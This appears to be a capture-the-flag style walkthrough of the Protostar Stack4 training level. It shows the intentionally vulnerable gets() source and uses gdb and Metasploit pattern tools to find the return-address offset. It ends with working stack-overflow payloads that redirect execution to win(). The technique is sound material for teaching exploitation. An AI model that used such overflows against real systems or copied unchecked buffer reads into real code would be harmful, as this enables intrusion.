# Protostar - Stack4
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack4__
* About
  Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

  This level is at /opt/protostar/bin/stack4

  Hints
    * A variety of introductory papers into buffer overflows may help.
    * gdb lets you do "run < input"
    * EIP is not directly after the end of buffer, compiler padding can also increase the size.

* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}

```
   
   For this challenge, we have to overflow the buffer and EBP and then override return address with the address of win(). 

   Let's find the address of win()
```
user@protostar:~$ objdump -d /opt/protostar/bin/stack4 | grep win
080483f4 <win>:
```

  We've got the address of win() at 0x080483f4 so we have to reverse it because of little endien >> **\xf4\x83\x04\x08**

  Then we must calculate the exact position of our return address, by the way the compiler may pad the code so the buffer may be added by 4 or 8 bytes.

  The buffer 64 bytes, EBP 4 bytes, guessing padding 8 bytes so the payload should be
  
  > python -c 'print("A"*(64+4+8) + "\xf4\x83\x04\x08")' | /opt/protostar/bin/stack4

  * In theory after buffer 64 bytes followed by 4 bytes EBP then we can overwrite the next 4 bytes EIP but in practical the compiler do something with the stack and not align stack in expected way so we have to add more bytes to find the correct EIP position

  * We can find the exact position of EIP by using pattern_create.rb in Kali2.0
```
root@BOEING:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

user@protostar:~$ gdb /opt/protostar/bin/stack4 
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack4 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

root@BOEING:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76

<in protostar>
user@protostar:~$ python -c 'print("A"*(76) + "\xf4\x83\x04\x08")' | /opt/protostar/bin/stack4
code flow successfully changed
```

### _Solution_
```
user@protostar:~$ python -c 'print("A"*(64+4+8) + "\xf4\x83\x04\x08")' | /opt/protostar/bin/stack4
code flow successfully changed
```
or 
```
user@protostar:~$ python -c 'print("A"*(76) + "\xf4\x83\x04\x08")' | /opt/protostar/bin/stack4
code flow successfully changed
```